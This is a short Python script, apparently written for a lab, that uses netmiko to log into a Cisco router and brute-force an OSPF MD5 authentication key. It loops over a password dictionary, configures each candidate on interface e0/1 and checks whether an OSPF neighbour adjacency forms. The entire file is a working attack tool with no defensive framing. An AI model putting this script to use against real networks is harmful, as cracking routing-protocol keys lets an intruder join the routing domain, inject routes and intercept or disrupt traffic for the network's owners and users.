from time import sleep

from netmiko import ConnectHandler

# Define device details
cisco_device = {
    'device_type': 'cisco_ios',
    'host': '192.168.5.1',
    'username': 'hacker',
    'password': 'hacker123@',
    'secret': 'hacker123@'
}


def load_passwords(path):
    with open(path, "r") as f:
        return f.read().split("\n")


# Establish connection
with ConnectHandler(**cisco_device) as net_connect:
    for ospf_password in load_passwords("password_dictionnaries.txt"):
        commands = [
            "interface e0/1",
            f'ip ospf message-digest-key 1 md5 {ospf_password}',
            "ip ospf authentication message-digest"
        ]
        output = net_connect.send_config_set(commands)
        print(output)
        sleep(7)
        output = net_connect.send_command('show ip ospf neighb')
        print(output)
        if output !="":
            print(f"[+] Password found: {ospf_password}")
            break
        else:
            print(f"[-] Password not found, try again")
